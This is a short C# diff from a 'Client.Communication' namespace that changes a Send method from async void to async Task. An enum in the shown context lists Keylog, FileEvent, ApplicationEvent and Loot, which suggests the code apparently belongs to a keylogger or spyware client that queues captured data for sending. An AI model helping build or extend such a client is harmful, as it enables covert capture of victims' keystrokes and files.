@@ -16,7 +16,7 @@ namespace Client.Communication
             Keylog, FileEvent, ApplicationEvent, Loot
         }
         private static List<Tuple<string, StringType>> _sdata = new List<Tuple<string, StringType>>();
-        public static async void Send(string sdata, StringType type)
+        public static async Task Send(string sdata, StringType type)
         {
             var data = new Tuple<string, StringType>(sdata, type);
             _sdata.Add(data);
